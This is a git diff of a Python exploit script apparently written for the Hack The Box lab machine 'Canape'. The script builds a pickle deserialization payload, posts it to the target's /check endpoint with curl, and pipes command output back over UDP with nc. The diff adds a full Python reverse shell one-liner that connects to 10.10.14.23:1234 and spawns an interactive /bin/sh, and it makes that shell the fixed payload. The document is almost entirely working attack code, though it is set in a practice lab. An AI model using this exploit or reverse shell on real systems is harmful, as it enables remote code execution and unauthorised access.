@@ -7,7 +7,7 @@ import socket
 
 PREFIX= "echo 'homer'; echo -e $("
 SUFFIX = ")\\\n | nc -u 10.10.14.23 6667"
-COMMAND = ""
+COMMAND = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.23\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
 
 class Exploit(object):
     def __reduce__(self):
@@ -28,13 +28,12 @@ def exploit():
     shellcode = open('/root/Hack-The-Box/Canape/shellcode', 'rb').read()
     p_id = md5(shellcode).hexdigest()
     os.system('curl -X POST -d "id=' + p_id + '" http://10.10.10.70/check')
-    
+
 def udp_server():
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.bind(('10.10.14.23', 6667))
     while True:
-        command = raw_input("Command: ")
-        generate_shellcode(command)
+        generate_shellcode(COMMAND)
         exploit()
         print(sock.recv(30000))
 
